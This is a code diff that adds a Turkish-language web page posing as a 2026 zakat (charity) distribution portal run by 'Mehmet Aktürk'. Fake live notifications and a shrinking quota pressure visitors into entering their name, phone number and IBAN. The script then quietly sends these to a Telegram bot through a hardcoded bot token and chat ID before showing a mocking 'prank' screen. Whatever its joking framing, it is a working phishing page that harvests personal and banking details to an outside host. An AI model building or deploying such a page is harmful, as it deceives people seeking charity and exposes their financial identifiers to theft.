@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mehmet Aktürk | 2026 Zekat Dağıtım Portalı</title>
+    <style>
+        :root { --green: #1b5e20; --gold: #d4af37; --red: #d32f2f; }
+        body { font-family: 'Times New Roman', serif; background: #f4f7f6; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        
+        /* Giriş Katmanı */
+        #music-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--green); z-index: 10000; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; }
+        
+        .container { background: white; width: 90%; max-width: 480px; padding: 25px; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.15); border: 2px solid var(--gold); text-align: center; display: none; }
+        
+        /* Sağdan Gelen Bildirim */
+        .live-notify { position: fixed; top: 20px; right: -350px; background: white; border-left: 6px solid var(--green); padding: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.2); transition: 0.6s; z-index: 999; border-radius: 4px; font-weight: bold; font-family: sans-serif; }
+        .live-notify.show { right: 20px; }
+
+        .stats { display: flex; justify-content: space-around; margin: 15px 0; font-weight: bold; border-bottom: 2px solid #eee; padding-bottom: 15px; }
+        .counter { color: var(--red); font-size: 1.4rem; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
+        .prize-box { background: #fffbe6; padding: 12px; border-radius: 8px; margin: 15px 0; text-align: left; border: 1px solid #ffe58f; }
+        .prize-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #ddd; font-size: 0.95rem; font-weight: bold; }
+
+        .form-group { text-align: left; margin-top: 15px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1.5px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 1rem; }
+        
+        .btn { background: var(--green); color: white; width: 100%; padding: 18px; border: none; border-radius: 6px; font-size: 1.3rem; font-weight: bold; cursor: pointer; }
+
+        /* FINAL ŞAKASI */
+        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .money-woman { width: 95%; max-width: 450px; border-radius: 15px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
+        .shout { font-size: 3.8rem; color: var(--red); margin: 20px 0; font-family: 'Arial Black', sans-serif; text-shadow: 2px 2px 0px #000; }
+    </style>
+</head>
+<body>
+
+    <div id="music-overlay">
+        <h2 style="font-size: 2rem;">🌙 Mehmet Aktürk Hayratı</h2>
+        <p>Zekat taksimatı portalına hoş geldiniz.<br>Güvenli bağlantı ve fon müziği için tıklayın.</p>
+        <button onclick="startApp()" style="padding: 15px 50px; font-weight: bold; cursor: pointer; border-radius: 40px; border: none; background: white; color: var(--green); font-size: 1.2rem;">Huzurla Başla</button>
+    </div>
+
+    <div id="notify" class="live-notify"></div>
+
+    <div class="container" id="main-ui">
+        <h1 style="color: var(--green); margin: 0; font-size: 1.6rem;">Zekat Taksimatı (2026)</h1>
+        <p style="font-style: italic; color: #555;">"Veren el, alan elden üstündür."</p>
+        
+        <div class="stats">
+            <div>Toplam Bütçe: <br><span style="color:var(--green); font-size: 1.2rem;">15.000 TL</span></div>
+            <div>Kalan Kontenjan: <br><span id="quota" class="counter">5</span></div>
+        </div>
+
+        <div class="prize-box">
+            <div class="prize-row"><span>1. Sıra (5.000 TL)</span> <span id="p1" style="color:#999">******* *******</span></div>
+            <div class="prize-row"><span>2. Sıra (4.000 TL)</span> <span id="p2" style="color:#999">******* *******</span></div>
+            <div class="prize-row"><span>3. Sıra (3.000 TL)</span> <span id="p3" style="color:#999">******* *******</span></div>
+            <div class="prize-row"><span>4. Sıra (2.000 TL)</span> <span id="p4" style="color:#999">******* *******</span></div>
+            <div class="prize-row"><span>5. Sıra (1.000 TL)</span> <span id="p5" style="color:#999">******* *******</span></div>
+        </div>
+
+        <div class="form-group">
+            <input type="text" id="name" placeholder="Adınız ve Soyadınız">
+            <input type="text" id="phone" placeholder="Telefon Numaranız">
+            <input type="text" id="iban" placeholder="IBAN (Örn: TR00...)">
+        </div>
+
+        <button class="btn" onclick="sendToTelegram()">KAYDET VE ÖDEME AL</button>
+        <p style="font-size: 10px; color: #aaa; margin-top: 15px;">© 2026 Aktürk Finans Koordinasyon Merkezi</p>
+    </div>
+
+    <div id="prank-screen">
+        <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJueXZueXJueXJueXJueXJueXJueXJueXJueXJueXJueXJueCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o6gDWzmAzrpi5DQU8/giphy.gif" class="money-woman">
+        <div class="shout">NAH ALIRSIN! :)</div>
+        <p style="font-size: 1.4rem; padding: 0 20px; font-weight: bold; color: #333;">Mehmet Aktürk der ki:<br> "Zekat bitti gençler, bayram harçlığı için el öpmeye bekliyorum!"</p>
+        <button onclick="location.reload()" style="margin-top:20px; padding: 12px 25px; cursor:pointer; border:none; background:#eee; border-radius:5px;">Kapat</button>
+    </div>
+
+    <audio id="bgMusic" loop><source src="1.mp3" type="audio/mpeg"></audio>
+
+    <script>
+        const BOT_TOKEN = "8661015295:AAHKejX77Kamc4trlYlyUZYapLaaICpxLAQ"; 
+        const CHAT_ID = "7956441035";
+
+        let quotaCount = 5;
+        // İsimleri tamamen kapalı yapıyoruz
+        const maskedPlaceholder = "******** ********";
+
+        function startApp() {
+            document.getElementById('music-overlay').style.display = 'none';
+            document.getElementById('main-ui').style.display = 'block';
+            document.getElementById('bgMusic').play();
+            
+            let idx = 0;
+            const timer = setInterval(() => {
+                if(idx < 4) { // İlk 4 kişi rastgele düşecek
+                    showNotify("Sıradaki kullanıcı başvurusunu tamamladı!");
+                    document.getElementById('p' + (idx+1)).innerText = "Doldu (Onaylandı)";
+                    document.getElementById('p' + (idx+1)).style.color = "green";
+                    quotaCount--;
+                    document.getElementById('quota').innerText = quotaCount;
+                    idx++;
+                } else {
+                    clearInterval(timer);
+                }
+            }, 15000); // 15 saniyede bir kontenjan düşer
+        }
+
+        function showNotify(msg) {
+            const n = document.getElementById('notify');
+            n.innerText = "🔔 " + msg;
+            n.classList.add('show');
+            setTimeout(() => n.classList.remove('show'), 4000);
+        }
+
+        function sendToTelegram() {
+            const name = document.getElementById('name').value;
+            const phone = document.getElementById('phone').value;
+            const iban = document.getElementById('iban').value;
+
+            if(!name || !iban) { alert("Lütfen tüm alanları doldurunuz!"); return; }
+
+            const text = `🎯 MEHMET ABİ KURBAN DÜŞTÜ!\n\n👤 İsim: ${name}\n📞 Tel: ${phone}\n💳 IBAN: ${iban}\n📢 Durum: Şaka yapıldı!`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+            fetch(url).catch(e => console.log(e));
+
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('prank-screen').style.display = 'flex';
+            document.getElementById('bgMusic').pause();
+        }
+    </script>
+</body>
+</html>
